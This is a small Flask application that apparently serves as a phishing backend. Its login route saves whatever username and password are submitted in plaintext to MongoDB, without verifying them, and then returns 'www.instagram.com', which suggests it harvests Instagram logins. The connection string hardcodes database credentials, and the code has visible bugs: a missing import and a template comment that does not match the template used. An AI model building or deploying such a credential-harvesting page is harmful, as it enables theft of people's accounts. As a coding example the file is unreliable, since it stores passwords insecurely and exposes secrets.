from flask import Flask, request, render_template
from pymongo import MongoClient

app = Flask(__name__, static_folder='static', template_folder='templates')

# MongoDB setup
client = MongoClient("mongodb+srv://Harsha1234:Harsha1234@cluster1.nwz3t.mongodb.net/login_db?retryWrites=true&w=majority")
db = client['login_db']
users_collection = db['users']

# Home route
@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/')
def home():
    return render_template('index.html')  # Ensure `reg.html` exists in the templates folder

# Login route
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']  # This stores the password in plain text

    # Store data in the MongoDB database
    user = {
        "username": username,
        "password": password  # WARNING: Storing plain text passwords is insecure
    }
    users_collection.insert_one(user)

    return "www.instagram.com"

if __name__ == '__main__':
    app.run(debug=True)
